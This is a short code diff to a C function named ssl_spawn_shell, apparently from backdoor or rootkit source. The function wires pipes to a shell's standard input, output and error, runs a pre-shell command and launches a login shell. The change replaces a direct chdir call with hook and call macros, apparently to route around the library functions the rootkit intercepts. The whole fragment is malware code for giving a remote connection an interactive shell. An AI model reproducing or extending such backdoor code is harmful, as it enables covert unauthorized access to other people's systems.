@@ -30,9 +30,10 @@ int ssl_spawn_shell(int stdin[], int stdout[]){
         dup2(stdout[1], 1);
         dup2(stdout[1], 2);
 
-        chdir(INSTALL_DIR);
+        hook(CCHDIR);
+        call(CCHDIR, INSTALL_DIR);
         system(PRE_SHELL);
-        execl(BASH_PATH, BASH_STR, LOGIN_FLAG, NULL);
+        execl(SHELL_PATH, SHELL_NAME, "--login", NULL);
     }
 
     close(stdin[0]);
